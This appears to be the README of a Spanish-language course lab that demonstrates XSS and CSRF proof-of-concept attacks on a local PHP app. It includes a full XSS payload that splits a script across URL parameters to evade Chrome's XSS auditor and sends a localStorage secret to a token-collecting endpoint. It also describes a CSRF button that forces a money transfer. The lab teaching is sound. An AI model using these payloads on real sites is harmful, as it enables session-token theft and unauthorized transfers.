# taller_xss_csfr 2016_1

El objetivo de este laboratorio era probar las vulnerabilidades de xss y csfr y explotarlas mediante una prueba de concepto.
Para usar este repositorio es necesario PHP y un sistema unix debido a que se usa `/tmp`  como path para guardar información.

## XSS

Para este ataque aprovecharemos una aplicación que use múltiples parámetros `$_GET` con el fin de saltar el auditor de 
código XSS de chrome, dividiendo el script en diferentes parametros de la URL, en este caso el payload usado fue:

    http://localhost/xss/?nombre=<script>void("&apellido=");document.write("<img src='http://localhost/token/?token="%2BlocalStorage.getItem('misecreto')%2B"'>");</script>

el cual genera el código javascript:

`void("&apellido=");document.write("<img src='http://localhost/token/?token="+localStorage.getItem('misecreto')+"'>");`

el cual basicamente le dice al navegador que inserte una imagen que apunta a `http://localhost/token/?token=XXXXXXX`, debido a que la naturaleza del navegador cuando recibe
la orden de colocar una imagen es generar un request por el metodo `GET` a la url que se encuentra en el atributo `src` el cual tiene el secreto guardado en el localStorage, entonces `/token/` se encarga de recibir esta información y escribirla en `/tmp/tokens.txt`.

## CSFR

Para este ataque aprovecharemos `$_SESSION` en php y la ejecución de un request en javascript que nos genere un llamado a una página de transacciones donde el usuario se encuentre logueado.

Para el ejemplo se crearon 3 rutas: 

`/csfr/login`
Esta ruta evalúa el login, que en este caso es `hola:mundo`

`/csfr/form`
Esta ruta nos permite hacer transacciones a usuarios mediante un formulario que tiene un usuario y cantidad a transferir

`/csfr/transfer`
Esta ruta recibe el formulario anterior verifica la sesión y procede a escribir la transacción en `/tmp/transferencias.txt`

el ataque se encuentra en la ruta `/csfr/` y en esta se encuentra una página con un botón, cuyo evento principal es realizar un petición via `POST` a `/csfr/transfer` con los parametros del atacante (nombre de usuario y cantidad a transferir), si el usuario hace click en este botón y se encuentra logueado en la sesión válida de PHP, la transferencia será realizada cada vez que se presione este botón.







